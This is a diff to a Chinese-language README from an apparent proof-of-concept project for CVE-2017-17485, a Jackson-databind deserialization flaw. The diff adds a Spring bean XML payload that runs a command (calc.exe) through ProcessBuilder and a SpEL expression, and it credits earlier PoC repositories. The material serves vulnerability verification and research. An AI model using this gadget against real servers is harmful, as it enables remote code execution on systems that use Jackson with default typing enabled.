@@ -20,12 +20,26 @@ com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
 ### 新漏洞的产生CVE-2017-17485
 在开启enableDefaultTyping()的前提下可以通过Jackson-databind来滥用Spring spel来执行任意命令。
 
-## 验证代码
+## 漏洞验证
 
 本项目中的war包基于廖师傅 https://github.com/shengqi158/Jackson-databind-RCE-PoC 的改造
 
 基友的 https://github.com/hucheat/vulns/tree/master/cve-2017-17485_web_vuln
 
+
+#### Spring spel
+```
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="
+     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+    <bean id="pb" class="java.lang.ProcessBuilder">
+        <constructor-arg value="calc.exe" />
+        <property name="whatever" value="#{ pb.start() }"/>
+    </bean>
+</beans>
+```
+验证代码
 ```
 package jackson;
 
